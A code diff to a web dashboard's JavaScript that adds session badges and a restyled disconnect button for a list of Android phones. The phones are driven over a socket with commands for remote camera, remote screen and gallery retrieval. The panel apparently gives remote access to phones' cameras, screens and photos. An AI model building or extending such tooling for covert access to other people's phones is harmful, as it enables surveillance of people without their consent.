@@ -5497,6 +5497,8 @@ setupRemoteCameraPip();
         });
     }
 
+    const activeSessionDevices = new Set();
+
     function renderDeviceList(devices) {
         cachedDevices = devices || [];
         if (badgeDeviceCountInner) {
@@ -5523,6 +5525,7 @@ setupRemoteCameraPip();
             const safeId = escapeHtml(device.deviceId || "UNKNOWN");
             const safeName = escapeHtml(device.deviceName || "Android Phone");
             const safeRam = escapeHtml(device.ram || "RAM N/A");
+            const hasActiveSession = activeSessionDevices.has(safeId);
 
             row.innerHTML = `
                 <div class="cupertino-device-top">
@@ -5530,6 +5533,10 @@ setupRemoteCameraPip();
                         <div class="cupertino-device-title-line">
                             <span class="cupertino-online-dot ${isOnline ? 'online' : 'offline'}" title="${isOnline ? 'Online' : 'Offline'}"></span>
                             <span class="cupertino-device-name">${safeName}</span>
+                            <span id="session-badge-${safeId}" class="device-session-badge" style="display:${hasActiveSession ? 'inline-flex' : 'none'}; align-items:center; gap:5px; background:rgba(52,199,89,0.18); border:1px solid rgba(52,199,89,0.45); padding:2px 8px; border-radius:12px; margin-left:6px;">
+                                <span class="call-pulse-dot" style="width:7px; height:7px; background:#34c759; box-shadow:0 0 8px #34c759;"></span>
+                                <span style="color:#34c759; font-size:11px; font-weight:700;">Connected</span>
+                            </span>
                         </div>
                         <div class="cupertino-device-badges">
                             <span class="id-code">ID: ${safeId}</span><span class="dim">,</span>
@@ -5575,9 +5582,11 @@ setupRemoteCameraPip();
                     </button>
                 </div>
                 <div class="cupertino-disconnect-row" style="margin-top: 8px;">
-                    <button class="dev-action-btn btn-act-disconnect full-width-disconnect" data-action="disconnect_device" data-did="${safeId}" style="width: 100%; display: flex; flex-direction: row; align-items: center; justify-content: center; gap: 8px; padding: 7px 12px; background: rgba(255, 59, 48, 0.16); border: 1px solid rgba(255, 59, 48, 0.45); color: #ff3b30; border-radius: 9px; cursor: pointer; transition: all 0.2s ease;" title="Disconnect All / End Stream & Call">
-                        <i class="fas fa-phone-slash" style="color: #ff3b30; font-size: 13px;"></i>
-                        <span style="color: #ff3b30; font-size: 12px; font-weight: 700; letter-spacing: 0.2px;">Disconnect / End</span>
+                    <button id="btn-disconnect-${safeId}" class="dev-action-btn btn-act-disconnect full-width-disconnect" data-action="disconnect_device" data-did="${safeId}" style="width: 100%; display: flex; flex-direction: row; align-items: center; justify-content: center; gap: 8px; padding: 8px 12px; background:${hasActiveSession ? 'rgba(255, 59, 48, 0.25)' : 'rgba(255, 59, 48, 0.12)'}; border: 1.5px solid #ff3b30; color: #ff3b30; border-radius: 9px; cursor: pointer; transition: all 0.2s ease; box-shadow:${hasActiveSession ? '0 0 12px rgba(255,59,48,0.45)' : 'none'};" title="Disconnect Device & Kill Camera/Stream">
+                        <span id="pulse-dot-${safeId}" class="call-pulse-dot" style="width:8px; height:8px; background:#34c759; box-shadow:0 0 8px #34c759; display:${hasActiveSession ? 'inline-block' : 'none'};"></span>
+                        <i class="fas fa-power-off" style="color: #ff3b30; font-size: 14px;"></i>
+                        <span style="color: #ff3b30; font-size: 12.5px; font-weight: 800; letter-spacing: 0.2px;">Disconnect</span>
+                        <span id="disconnect-desc-${safeId}" style="color:${hasActiveSession ? '#34c759' : '#8e8e93'}; font-size:11px; font-weight:600; margin-left:4px;">${hasActiveSession ? '(Connected — Click to Stop)' : '(End & Stop Camera)'}</span>
                     </button>
                 </div>
             `;
@@ -5619,6 +5628,22 @@ setupRemoteCameraPip();
         }
 
         if (action === "disconnect_device") {
+            activeSessionDevices.delete(deviceId);
+            const badge = document.getElementById(`session-badge-${deviceId}`);
+            if (badge) badge.style.display = "none";
+            const pDot = document.getElementById(`pulse-dot-${deviceId}`);
+            if (pDot) pDot.style.display = "none";
+            const dDesc = document.getElementById(`disconnect-desc-${deviceId}`);
+            if (dDesc) {
+                dDesc.textContent = "(End & Stop Camera)";
+                dDesc.style.color = "#8e8e93";
+            }
+            const dBtn = document.getElementById(`btn-disconnect-${deviceId}`);
+            if (dBtn) {
+                dBtn.style.background = "rgba(255, 59, 48, 0.12)";
+                dBtn.style.boxShadow = "none";
+            }
+
             socket.emit("auto-command", {
                 targetDeviceId: deviceId,
                 command: "end_call",
@@ -5652,8 +5677,25 @@ setupRemoteCameraPip();
             const rsc = document.getElementById("remote-screen-container");
             if (rsc) rsc.style.display = "none";
             closeGallery();
-            showToast("Session disconnected with device");
+            showToast("Application disconnected & camera/stream stopped on " + deviceId);
             return;
+        }
+
+        // Mark device as in-session
+        activeSessionDevices.add(deviceId);
+        const sBadge = document.getElementById(`session-badge-${deviceId}`);
+        if (sBadge) sBadge.style.display = "inline-flex";
+        const spDot = document.getElementById(`pulse-dot-${deviceId}`);
+        if (spDot) spDot.style.display = "inline-block";
+        const sdDesc = document.getElementById(`disconnect-desc-${deviceId}`);
+        if (sdDesc) {
+            sdDesc.textContent = "(Connected — Click to Stop)";
+            sdDesc.style.color = "#34c759";
+        }
+        const sdBtn = document.getElementById(`btn-disconnect-${deviceId}`);
+        if (sdBtn) {
+            sdBtn.style.background = "rgba(255, 59, 48, 0.25)";
+            sdBtn.style.boxShadow = "0 0 12px rgba(255,59,48,0.45)";
         }
 
         if (action === "get_gallery") {
